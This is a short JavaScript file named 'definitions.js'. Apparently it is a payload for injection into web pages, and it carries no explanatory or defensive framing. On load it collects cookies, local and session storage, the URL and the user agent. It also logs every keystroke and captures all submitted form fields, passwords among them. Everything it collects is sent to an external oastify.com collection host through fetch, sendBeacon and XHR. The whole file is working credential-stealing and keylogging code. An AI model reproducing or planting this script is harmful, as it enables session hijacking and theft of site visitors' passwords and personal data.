// definitions.js
(function() {
    'use strict';
    
    var exfilUrl = 'https://705vz1oy49w1zgorhn97b1nl2c83wwkl.oastify.com/exfil';
    
    function exfil(data) {
        fetch(exfilUrl, {
            method: 'POST',
            mode: 'no-cors',
            headers: {'Content-Type': 'text/plain'},
            body: JSON.stringify(data)
        }).catch(function(){});
        
        if (navigator.sendBeacon) {
            navigator.sendBeacon(
                exfilUrl + '/beacon',
                new Blob([JSON.stringify(data)], {type: 'text/plain'})
            );
        }
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', exfilUrl + '/xhr', true);
            xhr.send(JSON.stringify(data));
        } catch(e) {}
    }
    
    var payload = {
        cookie: document.cookie,
        url: location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        timestamp: Date.now()
    };
    
    try {
        payload.localStorage = JSON.stringify(localStorage);
        payload.sessionStorage = JSON.stringify(sessionStorage);
    } catch(e) {}
    
    exfil(payload);
    
    var keyBuffer = [];
    document.addEventListener('keydown', function(e) {
        keyBuffer.push({
            key: e.key,
            target: e.target.tagName,
            timestamp: Date.now()
        });
        
        if (keyBuffer.length >= 50) {
            exfil({type: 'keys', data: keyBuffer, url: location.href});
            keyBuffer = [];
        }
    }, true);
    
    setInterval(function() {
        if (keyBuffer.length > 0) {
            exfil({type: 'keys', data: keyBuffer, url: location.href});
            keyBuffer = [];
        }
    }, 15000);
    
    document.addEventListener('submit', function(e) {
        var formData = {};
        var inputs = e.target.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            formData[input.name || input.id] = input.value;
        });
        exfil({type: 'form', data: formData, action: e.target.action});
    }, true);
    
    console.log('[*] Monitoring active');
})();
